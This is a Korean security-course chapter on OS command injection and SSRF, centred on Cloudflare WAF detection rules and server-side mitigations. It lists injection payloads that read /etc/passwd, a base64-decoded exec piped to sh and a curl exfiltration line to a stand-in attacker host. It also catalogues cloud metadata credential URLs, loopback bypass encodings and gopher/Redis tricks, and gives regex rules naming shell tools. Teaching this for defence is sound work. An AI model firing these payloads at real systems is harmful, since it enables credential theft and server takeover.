# 06. Command Injection & SSRF — RCE와 내부 접근의 최단 경로

> OWASP Top 10:2025 기준 **A05 Injection** (Command Injection)과 다른 카테고리에 흡수된 **SSRF**를 함께 다룬다. 2025판에서 SSRF는 단독 Top 10 항목은 아니지만 실무적 위협도는 그대로.

## 학습 목표
- OS Command Injection과 SSRF의 공통점(공격자 제어 문자열 → 외부/내부 요청)과 차이점을 구분한다
- 셸 메타문자와 내부 메타데이터 주소를 WAF에서 어떻게 잡을지 설계한다
- WAF가 최종 방어선이 아니라는 점을 이해하고, 런타임·네트워크·클라우드 레이어 대응까지 연결한다

---

## 파트 1. OS Command Injection

---

## 1.1 공격 개요

애플리케이션이 사용자 입력을 **셸로 전달**하거나 **`exec()`·`system()`·`popen()`·`Runtime.exec()` 인자로 이어붙일** 때, 공격자가 셸 메타문자(`;`, `|`, `&`, `` ` ``, `$()`)를 주입해 임의 명령을 실행시킨다.

```
사용자 입력: 127.0.0.1; cat /etc/passwd
서버 코드:   os.system("ping " + input)
실제 실행:   ping 127.0.0.1; cat /etc/passwd
```

### 근본 원인
- 셸 호출 API(`shell=True`, `/bin/sh -c "..."`) 사용
- 입력 검증 없이 커맨드 조립
- 이미지 처리(ImageMagick), PDF 생성, 네트워크 진단(ping/curl) 같은 서브프로세스 호출 지점이 고위험

### 영향
- RCE(원격 코드 실행) — 전체 서버 장악의 지름길
- 역쉘(reverse shell) 설치
- 크리덴셜·키 탈취

---

## 1.2 페이로드 패턴

### 1.2.1 분리자
```
; cat /etc/passwd
| cat /etc/passwd
|| cat /etc/passwd
&& cat /etc/passwd
& whoami
%0a cat /etc/passwd    -- 개행
%0d cat /etc/passwd
```

### 1.2.2 명령 치환
```
`cat /etc/passwd`
$(cat /etc/passwd)
$(curl http://attacker.example/$(whoami))
```

### 1.2.3 인라인 명령
```
$(id)
$(/bin/ls)
$IFS$9cat$IFS/etc/passwd   -- 공백 우회 (IFS 변수)
{cat,/etc/passwd}          -- Brace expansion
```

### 1.2.4 인코딩
```
%3B%20cat%20/etc/passwd        -- URL encode
%253B%2520cat                  -- Double URL
echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|sh   -- base64 decoded exec
```

### 1.2.5 Windows
```
& whoami
&& dir
; whoami
powershell -enc <base64>
```

---

## 1.3 WAF에서 잡는 패턴

### 1.3.1 셸 메타문자 + 시스템 바이너리 근접 매칭
```
(lower(url_decode(http.request.uri.query)) matches
  "[;&|`]\s*(cat|ls|whoami|id|uname|wget|curl|nc|bash|sh|python|perl)\s")
→ Block
```
메타문자 **바로 뒤에 쉘 명령어**가 오는 패턴만 매칭해 오탐을 줄인다.

### 1.3.2 명령 치환 구문
```
(lower(url_decode(http.request.uri.query)) matches
  "(\$\(|`[^`]+`)")
→ Managed Challenge
```

### 1.3.3 base64 디코드 검사 (고급)
Cloudflare Ruleset Engine의 변환 함수로는 base64 내용 검사가 제한적이다. 이런 케이스는 **점수 기반**(`cf.waf.score.rce`) + 행동 신호 조합으로 잡는 편이 현실적.

### 1.3.4 RCE Attack Score
`cf.waf.score.rce`는 1~99 범위(낮을수록 공격 의심). SQLi/XSS와 동일하게 점수 기반 룰 가능.
```
(cf.waf.score.rce lt 20)
→ Managed Challenge
```

> 공식 문서: https://developers.cloudflare.com/waf/about/waf-attack-score/

---

## 1.4 애플리케이션 레이어 대응 (WAF 너머)

- **셸 미사용**: Python `subprocess.run([...], shell=False)`, Node `execFile(file, [args])` (문자열 concat 대신 배열 전달)
- **입력은 절대 shell로 전달 금지**: 경로·인자 화이트리스트
- **전용 라이브러리 사용**: 네트워크 진단은 소켓/HTTP 라이브러리로 직접 구현
- **최소 권한**: 웹 앱 프로세스는 쉘·컴파일러·패키지 매니저에 접근 못 하게

---

## 파트 2. SSRF (Server-Side Request Forgery)

---

## 2.1 공격 개요

서버가 **공격자 제어 URL로 요청을 보내도록** 유도한다. 결과는 보통 다음 중 하나.

1. **클라우드 메타데이터 서비스 탈취** — AWS IMDS, GCP Metadata, Azure IMDS
2. **내부망 스캐닝 / 내부 API 접근** — VPC 안쪽 서비스에 대한 프록시
3. **로컬 파일 읽기** — `file://`, `gopher://`
4. **공격 소스 위장** — IP 우회

### 발생 지점
- URL 미리보기/썸네일 생성
- Webhook, 외부 HTTP 호출 기능
- 이미지 URL로부터 다운로드
- PDF 변환, XML 파서(XXE와 결합)
- 리다이렉트 처리

---

## 2.2 타겟 주소 카탈로그

### 2.2.1 클라우드 메타데이터
```
AWS IMDS:
  http://169.254.169.254/latest/meta-data/
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
  (IMDSv2는 PUT+토큰 필요해 난이도 ↑)

GCP:
  http://metadata.google.internal/computeMetadata/v1/
  (헤더 Metadata-Flavor: Google 필요)

Azure:
  http://169.254.169.254/metadata/instance?api-version=2021-02-01
  (헤더 Metadata: true 필요)

Alibaba:
  http://100.100.100.200/latest/meta-data/
```

### 2.2.2 루프백·링크로컬
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://[::]
http://0177.0.0.1       -- 8진수
http://2130706433       -- 10진수 (127.0.0.1)
http://0x7f000001       -- 16진수
```

### 2.2.3 내부망
```
http://10.0.0.0/8
http://172.16.0.0/12
http://192.168.0.0/16
http://internal.example
```

### 2.2.4 우회용 프로토콜
```
file:///etc/passwd
gopher://127.0.0.1:6379/_SET%20...   -- Redis 명령 삽입
dict://127.0.0.1:11211/stats         -- Memcached
```

### 2.2.5 DNS Rebinding / 리다이렉트
- 공격자 도메인이 초기엔 외부 IP, 캐시 TTL 만료 후 `127.0.0.1` 응답
- 서버가 첫 조회 때 통과 → 두 번째 요청에서 내부 접근

---

## 2.3 Cloudflare에서의 SSRF 탐지 — 인바운드 파라미터 검사

Cloudflare는 **아웃바운드 트래픽을 보지 못한다**. 대신 **인바운드 요청의 파라미터에 내부/메타데이터 URL이 포함됐는지**를 검사한다.

### 2.3.1 메타데이터 주소 탐지
```
(lower(url_decode(http.request.uri.query)) matches
  "(169\.254\.169\.254|metadata\.google\.internal|100\.100\.100\.200)") or
(lower(url_decode(http.request.uri.query)) matches
  "(127\.0\.0\.1|localhost|0\.0\.0\.0|\[::1?\])")
→ Managed Challenge
```

### 2.3.2 바디 기반 검사 (Enterprise)
```
(http.request.uri.path matches "^/api/(fetch|webhook|preview)") and
(lower(url_decode(http.request.body.raw)) matches
  "(169\.254|metadata\.google|127\.0\.0\.1|0x7f|2130706433)")
→ Block
```

### 2.3.3 우회용 숫자 표기 대응
```
# 16진수·8진수·10진수 IP 표기
(lower(url_decode(http.request.uri.query)) matches
  "(0x[0-9a-f]+|0[0-7]{3,}|(25[0-5]|2[0-4]\d|[01]?\d\d?)){1}")
```
정규식이 까다로워서 오탐이 크다. 경로를 좁혀 적용할 것.

### 2.3.4 파일·Gopher 프로토콜
```
(lower(url_decode(http.request.uri.query)) matches
  "(file://|gopher://|dict://)")
→ Block
```

---

## 2.4 진짜 SSRF 방어는 서버·네트워크 레이어

WAF는 보조다. 핵심 대응은 다음에서 한다.

### 2.4.1 클라우드 메타데이터
- **IMDSv2 강제** (AWS): PUT 요청 + 토큰 필요
- **메타데이터 접근 가능한 hop limit 1**로 제한 (컨테이너에서 접근 차단)
- GCP/Azure는 헤더 기반 보호 그대로 유지
- 가능하면 메타데이터 없이도 동작하도록 IAM Role/Workload Identity 설계

### 2.4.2 네트워크
- 애플리케이션 서버에서 **내부 RFC1918 대역 outbound deny**
- 외부 HTTP 호출은 **명시된 도메인만 허용하는 egress proxy** 경유
- DNS는 내부 리졸버에서 RFC1918·루프백 응답 필터

### 2.4.3 애플리케이션
- URL 파싱 후 **호스트명 → IP 해석 → 허용 IP 대역 검증 → 실제 요청** 순서 (TOCTOU 주의: 같은 IP로 한번 더 연결)
- 리다이렉트 follow 시마다 재검증
- `file://`, `gopher://`, `dict://` 등 **스킴 화이트리스트** (`http`, `https`만)

---

## 3. 실제 로그 예시

### 3.1 Command Injection
```json
{
  "ClientIP": "198.51.100.77",
  "ClientRequestMethod": "GET",
  "ClientRequestURI": "/diagnostic?host=127.0.0.1%3B%20cat%20%2Fetc%2Fpasswd",
  "EdgeResponseStatus": 403,
  "SecurityAction": "block",
  "WAFAttackScore": 6,
  "WAFRCEAttackScore": 4,
  "BotScore": 8
}
```
URL 디코드: `host=127.0.0.1; cat /etc/passwd` — 진단 엔드포인트에 대한 전형적 command injection.

### 3.2 SSRF
```json
{
  "ClientIP": "198.51.100.88",
  "ClientRequestMethod": "POST",
  "ClientRequestURI": "/api/webhook/preview",
  "ClientRequestUserAgent": "python-requests/2.31",
  "EdgeResponseStatus": 403,
  "SecurityAction": "challenge",
  "BotScore": 15
}
```
바디(가상): `{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}`
→ webhook 미리보기 엔드포인트를 통한 IMDS 탈취 시도.

---

## 4. 운영 체크리스트

### 4.1 Command Injection
- [ ] `cf.waf.score.rce` 기반 경로별 룰
- [ ] 셸 메타문자 + 시스템 바이너리 근접 매칭 룰
- [ ] 앱: 셸 미사용, 인자 배열 전달, 화이트리스트
- [ ] 런타임 프로세스 권한 최소화

### 4.2 SSRF
- [ ] 인바운드 파라미터·바디에서 내부/메타데이터 URL 탐지
- [ ] 웹훅·URL 미리보기 엔드포인트 경로 식별 후 강한 룰 적용
- [ ] IMDSv2 강제 + hop limit 1
- [ ] 앱 서버 outbound에 RFC1918·169.254/16 deny
- [ ] URL 파싱·IP 해석·재검증 로직 일관 적용

---

## 5. 체크포인트

<details>
<summary>Q1. Command Injection을 WAF로 100% 막을 수 있는가?</summary>

아니다. 인코딩·base64·우회 기법이 무수히 많고, WAF는 **요청 시점의 문자열 패턴**만 본다. 애플리케이션에서 **셸 자체를 사용하지 않고 인자 배열로 프로세스를 띄우는 것**이 정답. WAF는 자동화 공격·고전 페이로드의 90%를 걸러주는 **1차 필터** 역할로 이해해야 한다.
</details>

<details>
<summary>Q2. AWS IMDSv1과 IMDSv2의 차이와 SSRF 방어 의미는?</summary>

IMDSv1은 **단순 GET**으로 자격 증명을 반환한다. SSRF로 GET 한 번만 가능해도 탈취. IMDSv2는 **PUT으로 세션 토큰을 먼저 받아야 하고** 토큰을 헤더로 제출해야 한다. 대부분의 SSRF는 GET 한 번에 그치기 때문에 IMDSv2 강제만으로도 상당수가 차단된다. 추가로 hop limit 1을 걸면 컨테이너 내부에서의 메타데이터 접근을 막을 수 있다.
</details>

<details>
<summary>Q3. 도메인 화이트리스트 방식의 SSRF 방어가 DNS rebinding에 취약한 이유는?</summary>

앱이 "검증 단계에서 resolve한 IP"와 "실제 HTTP 요청에서 resolve한 IP"가 다를 수 있기 때문이다. 공격자가 짧은 TTL로 도메인을 운영하다가 검증 직후 `127.0.0.1`로 바꾸면 검증은 통과하고 실제 요청은 루프백으로 간다. 대응은 **검증 시 IP를 고정해서 그 IP로만 연결**하거나, **resolve를 한 번만 하고 동일 IP로 재사용**하는 방식.
</details>

---

## 6. 더 읽을거리

- OWASP — Command Injection: https://owasp.org/www-community/attacks/Command_Injection
- OWASP Cheat Sheet — OS Command Injection Defense: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- OWASP — Server Side Request Forgery: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- OWASP Cheat Sheet — SSRF Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- PortSwigger — OS command injection: https://portswigger.net/web-security/os-command-injection
- PortSwigger — SSRF: https://portswigger.net/web-security/ssrf
- AWS — IMDSv2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html
- Cloudflare — WAF attack score: https://developers.cloudflare.com/waf/about/waf-attack-score/

---

**다음 챕터**: `07_path_traversal_lfi.md` — Path Traversal, Local/Remote File Inclusion, 경로 정규화 우회
